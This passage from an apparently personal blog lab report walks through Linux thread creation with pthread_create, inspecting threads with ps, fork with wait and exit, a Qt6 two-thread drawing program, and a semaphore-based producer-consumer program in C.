thread. If the thread exits through pthread_exit, retval will contain the value passed to pthread_exit. If the thread exits by returning (i.e., the thread start routine returns), retval will contain the returned value.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>Detailed explanation of pthread_create function:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/pthread_create.png" alt="Detailed explanation of pthread_create function"></p><p>Use the command <code>gcc -o mission1 mission1.c -lpthread</code> to compile the file and execute it.</p><h3 id="View-Process-Running-Status-During-Execution"><a href="#View-Process-Running-Status-During-Execution" class="headerlink" title="View Process Running Status During Execution"></a>View Process Running Status During Execution</h3><p>Common commands for viewing processes or threads:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep [process name] <span class="comment"># View information of processes with specific names</span></span><br><span class="line">lixiang     4874    3403  0 11:11 pts/1    00:00:00 ./mission1</span><br><span class="line">lixiang     4883    3455  0 11:12 pts/2    00:00:00 grep --color=auto mission1</span><br><span class="line"></span><br><span class="line">ps -T -p [process PID] <span class="comment"># View information of process with specific PID (-T shows its threads)</span></span><br><span class="line">PID    SPID    TTY       TIME       CMD</span><br><span class="line">4874   4874   pts/1    00:00:00   mission1</span><br><span class="line">4874   4875   pts/1    00:00:00   mission1</span><br><span class="line">4874   4876   pts/1    00:00:00   mission1</span><br><span class="line"></span><br><span class="line">ps -Tfl -p [process PID] <span class="comment"># More detailed display of process information with specific PID (including CPU utilization, etc.)</span></span><br><span class="line">F S UID          PID    SPID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD</span><br><span class="line">0 S lixiang     4945    4945    3403  0  80   0 - 21144 futex_ 11:17 pts/1    00:00:00 ./mission1</span><br><span class="line">1 S lixiang     4945    4946    3403  0  80   0 - 21144 hrtime 11:17 pts/1    00:00:00 ./mission1</span><br><span class="line">1 S lixiang     4945    4947    3403  0  80   0 - 21144 hrtime 11:17 pts/1    00:00:00 ./mission1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Below are introductions to commonly used parameters:</span></span><br><span class="line">-e: Display all processes, not just current user<span class="string">&#x27;s processes.</span></span><br><span class="line"><span class="string">-f: Display complete process information, including parent process ID, CPU utilization, etc.</span></span><br><span class="line"><span class="string">-l: Display process information in long format, including process status, PID, terminal, CPU utilization, etc.</span></span><br><span class="line"><span class="string">-u user: Display process information for specified user.</span></span><br><span class="line"><span class="string">-p pid: Display process information for specified PID.</span></span><br><span class="line"><span class="string">-s: Sort output by process start time.</span></span><br><span class="line"><span class="string">-r: Sort output by process CPU utilization.</span></span><br><span class="line"><span class="string">-T: Display threads</span></span><br></pre></td></tr></table></figure><p>After running mission1, use ps command to display its detailed information</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/pid_spid.png" alt="Detailed information of mission1 process"></p><p>In the figure, SPID represents the thread ID numbers, 3852 and 3852 are the A and B threads we created</p><h3 id="Program-Execution-Results"><a href="#Program-Execution-Results" class="headerlink" title="Program Execution Results"></a>Program Execution Results</h3><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/result.png" alt="Execution result"></p><p>Reference Materials:</p><p><a href="https://blog.csdn.net/qq_44824574/article/details/110672780">Linux - Thread Creation</a></p><p><a href="https://blog.csdn.net/qq_37037348/article/details/131491031#:~:text=%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8E%9F%E7%90%86%201%20ps%E5%91%BD%E4%BB%A4%E9%80%9A%E8%BF%87%E8%AF%BB%E5%8F%96%2Fproc%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96%E8%BF%9B%E7%A8%8B%E7%9A%84%E8%AF%A6%E7%BB%86%E4%BF%A1%E6%81%AF%E3%80%82,2%20%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8C%85%E5%90%AB%E4%BA%86%E8%BF%9B%E7%A8%8B%E7%9A%84PID%E3%80%81%E7%8A%B6%E6%80%81%E3%80%81%E7%88%B6%E8%BF%9B%E7%A8%8BID%E3%80%81CPU%E5%88%A9%E7%94%A8%E7%8E%87%E3%80%81%E5%86%85%E5%AD%98%E5%8D%A0%E7%94%A8%E7%AD%89%E4%BF%A1%E6%81%AF%E3%80%82%203%20ps%E5%91%BD%E4%BB%A4%E8%A7%A3%E6%9E%90%E8%BF%9B%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%96%87%E4%BB%B6%E5%B9%B6%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA%EF%BC%8C%E4%BB%A5%E4%BE%BF%E7%94%A8%E6%88%B7%E6%9F%A5%E7%9C%8B%E3%80%82">ps Command Introduction</a></p><p><a href="https://www.linuxcool.com/ps">Complete ps Command Manual</a></p><h2 id="Task-2-Create-fork-a-Child-Process-in-Linux-Experiment-with-wait-exit-Functions"><a href="#Task-2-Create-fork-a-Child-Process-in-Linux-Experiment-with-wait-exit-Functions" class="headerlink" title="Task 2: Create (fork) a Child Process in Linux, Experiment with wait&#x2F;exit Functions"></a>Task 2: Create (fork) a Child Process in Linux, Experiment with wait&#x2F;exit Functions</h2><p>Requirements:</p><ol><li>Effect 1: Parent process does not use wait function, let parent process end before child process, child process enters infinite loop or long-term loop, observe process ID and parent process ID of parent and child processes.<ol><li>Use printf in the program to output process number and parent process number of each process. Note, parent process and child process output should provide corresponding prompt strings for mutual distinction, same below</li><li>At the same time, use ps command to display process list, observe process ID and parent process ID of specified processes, and explain whether these IDs are consistent with those output by printf.</li></ol></li><li>Effect 2: Parent process uses wait function. Child process sleeps for 5 seconds, parent process does not sleep. Child process uses exit to return parameters. Parent process printf the parameters returned by child process.</li></ol><h3 id="Effect-One"><a href="#Effect-One" class="headerlink" title="Effect One"></a>Effect One</h3><p>The core of this task is to let the parent process end before the child process, observing the changes in process IDs.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Child process</span></span><br><span class="line">        <span class="comment">// Child process enters infinite loop</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Child process print: Child process PID: %d, Parent process PID: %d\n&quot;</span>, getpid(), getppid());</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Parent process</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Parent process print: Parent process PID: %d, Child process PID: %d\n&quot;</span>, getpid(), pid);</span><br><span class="line">        sleep(<span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// fork failed</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to create child process\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Program execution result is as follows:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/2-program1_run.png" alt="Program execution result"></p><p>Parent process PID&#x3D;3604, child process PID&#x3D;3605, then after the parent process ends after 20s, the child process prints its own PID and parent process PID. Within the 20s before the parent process ends, the child process prints parent process PID&#x3D;3604, but after the parent process ends, the child process continues running, and at this time the parent process ID becomes 1. The reason for this effect is:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/2-program1-explain.png" alt="Reason why child process&#39;s parent process ID becomes 1 after parent process ends"></p><h3 id="Effect-Two"><a href="#Effect-Two" class="headerlink" title="Effect Two"></a>Effect Two</h3><p>Child process ends before parent process, and uses exit to return a value, parent process prints this status value.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Child process</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child process print: Child process PID: %d, Parent process PID: %d\n&quot;</span>, getpid(), getppid());</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">42</span>); <span class="comment">// Use exit to return status value 42</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// Parent process</span></span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        wait(&amp;status); <span class="comment">// wait for child process to finish</span></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Child process exit status: %d\n&quot;</span>, WEXITSTATUS(status));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// fork failed</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to create child process\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Program execution result is as follows:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/2-program2_run.png" alt="Program execution result"></p><p>In the code, child process exit(42), parent process prints the exit status code 42.</p><p><a href="https://blog.csdn.net/qq_43412060/article/details/105442802">【Linux】——Process Creation fork() Detailed Explanation</a></p><h2 id="Task-3-Use-Threads-to-Implement-Concurrent-Drawing-of-Circles-and-Squares-in-Windows-Linux"><a href="#Task-3-Use-Threads-to-Implement-Concurrent-Drawing-of-Circles-and-Squares-in-Windows-Linux" class="headerlink" title="Task 3: Use Threads to Implement Concurrent Drawing of Circles and Squares in Windows&#x2F;Linux"></a>Task 3: Use Threads to Implement Concurrent Drawing of Circles and Squares in Windows&#x2F;Linux</h2><p>For this task, I used Qt6 to implement a dual-threaded GUI interface for drawing circles and squares. Here I only explain the core code parts:</p><p>Since Qt’s <strong>drawing actions can only be completed in the main thread</strong>, our two threads for drawing circles and squares are used to calculate the coordinate points of circles and squares respectively, and pass them to the main thread, which completes the corresponding drawing actions.</p><p>Project file directory is as follows:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-directory.png" alt="Project file directory"></p><p>First, Qt needs to overwrite paintEvent in the MainWindow class to draw graphics:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainWindow::paintEvent</span><span class="params">(QPaintEvent *event)</span> </span>&#123;</span><br><span class="line">    <span class="function">QPainter <span class="title">painter</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">    painter.<span class="built_in">setPen</span>(Qt::blue);</span><br><span class="line">    <span class="comment">// Draw all circle points</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> QPoint &amp;pt : circlePoints) &#123;</span><br><span class="line">        painter.<span class="built_in">drawPoint</span>(pt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Connect points to draw circle (optional)</span></span><br><span class="line">    <span class="keyword">if</span> (circlePoints.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        painter.<span class="built_in">setPen</span>(Qt::red);</span><br><span class="line">        painter.<span class="built_in">drawPolyline</span>(circlePoints.<span class="built_in">constData</span>(), circlePoints.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Draw all square points</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">const</span> QPoint &amp;pt : squarePoints) &#123;</span><br><span class="line">        painter.<span class="built_in">drawPoint</span>(pt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Connect points to draw square (optional)</span></span><br><span class="line">    <span class="keyword">if</span> (squarePoints.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        painter.<span class="built_in">setPen</span>(Qt::blue);</span><br><span class="line">        painter.<span class="built_in">drawPolyline</span>(squarePoints.<span class="built_in">constData</span>(), squarePoints.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Two thread-related classes, one is a circle thread class, one is a square thread class, they are both subclasses of Qt’s thread class QThread. Since they only differ in coordinate point calculation, I’ll choose the circle thread class to explain:</p><p>The process function in the circle thread class is used to handle the next coordinate point, then emit the circlePoint signal, passing this coordinate to the main thread for processing.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CircleThread::process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">double</span> radianIncrement = <span class="number">2</span> * (M_PI / <span class="number">180.0</span>); <span class="comment">// Radian increment each time (1 degree)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Calculate new point position, using circle&#x27;s parametric equation as example</span></span><br><span class="line">    <span class="type">int</span> centerX = center.<span class="built_in">x</span>();</span><br><span class="line">    <span class="type">int</span> centerY = center.<span class="built_in">y</span>();</span><br><span class="line">    <span class="type">int</span> x = centerX + <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(radius * <span class="built_in">cos</span>(circleAngle));</span><br><span class="line">    <span class="type">int</span> y = centerY + <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(radius * <span class="built_in">sin</span>(circleAngle));</span><br><span class="line">    circleAngle += radianIncrement;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Send new point position</span></span><br><span class="line">    <span class="function">emit <span class="title">circlePoint</span><span class="params">(QPoint(x, y))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For the circle thread class, we need to overwrite the run function. The run function is called when the thread starts. The specific logic is to call the process function at intervals. The process function handles point information and then sends it to the main thread.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CircleThread::run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">isInterruptionRequested</span>()) &#123;</span><br><span class="line">        <span class="built_in">process</span>();</span><br><span class="line">        <span class="keyword">if</span> (circleAngle &gt;= <span class="number">2</span> * M_PI) <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">msleep</span>(<span class="number">62</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>What the main thread needs to do is initialize an instance of the circle thread class and connect the circlePoint signal mentioned earlier with the slot that handles points. Note that the Slot function is written as a Lambda expression, adding the points returned from the child thread to the circle point set, then updating the drawing.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create circle drawing thread</span></span><br><span class="line">circleThread = <span class="keyword">new</span> <span class="built_in">CircleThread</span>(<span class="keyword">this</span>, <span class="built_in">QPoint</span>(<span class="built_in">width</span>() / <span class="number">4</span>, <span class="built_in">height</span>() / <span class="number">2</span> - <span class="built_in">height</span>() / <span class="number">10</span>), <span class="built_in">qMin</span>(<span class="built_in">width</span>() / <span class="number">2</span>, <span class="built_in">height</span>()) / <span class="number">2</span> - <span class="number">50</span>);</span><br><span class="line"><span class="comment">// Connect circle drawing thread&#x27;s data sending signal with main thread&#x27;s data receiving slot function</span></span><br><span class="line"><span class="built_in">connect</span>(circleThread, &amp;CircleThread::circlePoint, <span class="keyword">this</span>, [&amp;](<span class="type">const</span> QPoint &amp;pt) &#123;</span><br><span class="line">    circlePoints.<span class="built_in">append</span>(pt);</span><br><span class="line">    <span class="comment">// Update to call paintEvent</span></span><br><span class="line">    <span class="built_in">update</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>The final step is relatively simple. We need to start the threads, and thread startup is controlled by the “Start Drawing” button. Clicking it starts both threads.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This is a slot function used to connect with button&#x27;s click signal</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainWindow::on_startpaint_clicked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Start circle drawing thread</span></span><br><span class="line">    circleThread-&gt;<span class="built_in">start</span>();</span><br><span class="line">    <span class="comment">// Start square drawing thread</span></span><br><span class="line">    squareThread-&gt;<span class="built_in">start</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Finally, start the program. The program execution effect is as follows:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/%E5%8F%8C%E7%BA%BF%E7%A8%8B%E7%94%BB%E5%9C%86%E6%96%B9.gif" alt="Program execution effect"></p><p>Reference Materials:</p><p><a href="https://blog.csdn.net/qq_48985554/article/details/114990083">Qt Multi-threading Method 1 (Step-by-step explanation + code + demonstration)</a></p><p><a href="https://doc.qt.io/">Qt Documentation</a></p><h2 id="Task-4-Use-Threads-to-Implement-“Producer-Consumer”-Synchronization-Control-in-Windows-or-Linux"><a href="#Task-4-Use-Threads-to-Implement-“Producer-Consumer”-Synchronization-Control-in-Windows-or-Linux" class="headerlink" title="Task 4: Use Threads to Implement “Producer-Consumer” Synchronization Control in Windows or Linux"></a>Task 4: Use Threads to Implement “Producer-Consumer” Synchronization Control in Windows or Linux</h2><p>Task Requirements:</p><ol><li>Use an array (10 elements) instead of a buffer. 2 input threads produce products (random numbers) and store them in the array; 3 output threads take numbers from the array and output them.</li><li>Linux uses mutex objects and lightweight semaphore objects, main functions: sem_wait(), sem_post(), pthread_mutex_lock(), pthread_mutex_unlock()</li><li>Producer 1 data: 1000-1999 (random interval 100ms-1s for each data), Producer 2 data: 2000-2999 (random interval 100ms-1s for each data)</li><li>Consumers sleep for random time 100ms-1s to consume one data.</li><li>Screen print (or log file record) production and consumption records for each data.</li></ol><p>Source code is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Buffer and related synchronization mechanisms</span></span><br><span class="line"><span class="type">int</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="type">int</span> in = <span class="number">0</span>, out = <span class="number">0</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex;</span><br><span class="line"><span class="type">sem_t</span> empty, full;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Random sleep time</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">random_sleep</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> rand() % <span class="number">901</span> + <span class="number">100</span>; <span class="comment">// Random time from 100ms to 1s</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Producer thread function</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">producer</span><span class="params">(<span class="type">void</span> *param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)param;</span><br><span class="line">    <span class="type">int</span> base = id == <span class="number">1</span> ? <span class="number">1000</span> : <span class="number">2000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> product = base + rand() % <span class="number">1000</span>;</span><br><span class="line">        sem_wait(&amp;empty);</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Store product in buffer</span></span><br><span class="line">        buffer[in] = product;</span><br><span class="line">        in = (in + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Producer %d produced %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sem_post(&amp;full);</span><br><span class="line"></span><br><span class="line">        usleep(random_sleep() * <span class="number">1000</span>); <span class="comment">// Sleep</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Consumer thread function</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">consumer</span><span class="params">(<span class="type">void</span> *param)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id = *(<span class="type">int</span> *)param;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sem_wait(&amp;full);</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Take product from buffer</span></span><br><span class="line">        <span class="type">int</span> product = buffer[out];</span><br><span class="line">        out = (out + <span class="number">1</span>) % BUFFER_SIZE;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Consumer %d consumed %d\n&quot;</span>, id, product);</span><br><span class="line"></span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sem_post(&amp;empty);</span><br><span class="line"></span><br><span class="line">        usleep(random_sleep() * <span class="number">1000</span>); <span class="comment">// Sleep</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> producers[<span class="number">2</span>], consumers[<span class="number">3</span>];</span><br><span class="line">    <span class="type">int</span> producer_ids[<span class="number">2</span>] = &#123;<span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">    <span 